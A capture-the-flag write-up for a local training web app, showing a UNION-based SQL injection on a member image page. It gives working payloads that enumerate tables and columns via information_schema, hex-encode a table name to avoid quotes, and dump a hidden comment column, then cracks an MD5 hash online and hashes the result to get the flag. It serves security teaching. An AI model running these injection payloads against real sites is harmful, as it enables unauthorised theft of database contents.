# Member_Sql_Injection

Similar to the previous injection with users


## The members page

In this page: `http://localhost:8080/index.php?page=member`
you can look up images by id but it is open to sql injection.


Try to enter the following:

```sql
1 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database()
```

I get the database name:

```txt
ID: 1 union select 1, database() 
Title: Member_images
Url : 1
```

table listing explicitly:

```sql
1 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database()
```

```txt
ID: 1 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database() 
Title: Nsa
Url : https://fr.wikipedia.org/wiki/Programme_
ID: 1 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database() 
Title: list_images
Url : 1
```


the result set is a merge of:  

```sql
SELECT title, url FROM list_images WHERE id = 1 UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema = database()
```

Where this is the hidden one `SELECT title, url FROM list_images WHERE id = `

Because in the second `SELECT`, you can only use:

1. columns that exist in `information_schema.tables`
2. constants like `1`
3. SQL functions/expressions

This works:

```sql
1 UNION SELECT 1, table_name
FROM information_schema.tables
WHERE table_schema = database()
```

because:

- `1` is a valid constant
- `table_name` is a real column in `information_schema.tables`

If you try something like:

```sql
1 UNION SELECT url, table_name
FROM information_schema.tables
WHERE table_schema = database()
```

it fails because `url` is not a column of `information_schema.tables`.

`url` belongs to your application table, likely `list_images`, not to the metadata table.

So the second half of the `UNION` is evaluated against this table:

```sql
information_schema.tables
```

and its columns are things like:

- `table_name`
- `table_schema`
- `engine`
- `table_rows`

not `url`, not `title`.

That is the key rule:
- `FROM list_images` lets you select `title`, `url`
- `FROM information_schema.tables` lets you select `table_name`, `table_schema`, etc.

Why `1` is commonly used:
- it is always valid
- it helps satisfy the correct column count
- it avoids guessing a real column name

So if the original query is likely:

```sql
SELECT title, url FROM list_images WHERE id = 1
```

then your injected half must also return 2 columns, for example:

```sql
SELECT 1, table_name FROM information_schema.tables ...
```

or

```sql
SELECT table_name, 1 FROM information_schema.tables ...
```

If you want to extract real `title` and `url` values, then your injected `FROM` must be `list_images`, not `information_schema.tables`.


## getting the columns

```sql
1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name=list_images;
```

but this would also fail

```sql
1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='list_images'
```

better to encode it 

```sql
1 UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573
```

so i get the names of the columns... 'comments is interesting!

USE

```sql
1 UNION SELECT comment, title FROM list_images
```

then

```txt
ID: 1 UNION SELECT comment, title FROM list_images 
Title: Hack me ?
Url : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

Ok so on crackstation.net i get that:
`1928e8083cf461a51303633093573c46` is `albatroz`

and albatroz is getting me:
```bash
echo -n "albatroz" | shasum -a 256
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
# or 
echo -n "albatroz" | openssl dgst -sha256
```

and same on the cyberchef website. be careful to the spaces...